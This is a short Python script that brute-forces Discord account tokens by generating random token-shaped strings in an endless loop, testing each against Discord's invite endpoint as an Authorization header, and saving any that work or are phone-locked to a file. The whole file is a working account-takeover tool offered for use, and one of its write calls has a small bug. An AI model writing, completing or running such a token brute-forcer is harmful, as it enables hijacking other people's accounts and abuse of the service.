import base64
import os
import random
from random import randint
import string
import requests
from colorama import *

debug = True

green = Fore.GREEN
yellow = Fore.YELLOW
red = Fore.RED

def check_token(token):
    response = requests.post(f'https://discord.com/api/v6/invite/{randint(1,9999999)}', headers={'Authorization': token})
    if response.status_code == 401:
        return 'Invalid'
    elif "You need to verify your account in order to perform this action." in str(response.content):
        return 'Phone Lock'
    else:
        return 'Valid'
def resp_to_printback(resp):
  if resp == 'Valid':
    return str(green + '[+] Valid Token' + ' ' + token)      
  elif resp == 'Phone Lock':
    return str(yellow + '[!] Phone Locked Token' + ' ' + token)   
  else:
    return str(red + '[-] Invalid Token' + ' ' + token)
while True:
    token = ('').join(random.choices(string.ascii_letters + string.digits, k=25))+ '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
    resp_code = check_token(token)
    resp_txt = resp_to_printback(resp_code)
    
    with open('log.txt', 'a+') as log_file:
    	log_file.write(f'{resp_txt}\n')
    if resp_code != 'Invalid':
    	with open(f'valid.txt', 'a+') as valid_file:
    		valid_file.write('{resp_txt}\n')
    
    if debug == True: print(resp_txt)
    	
input()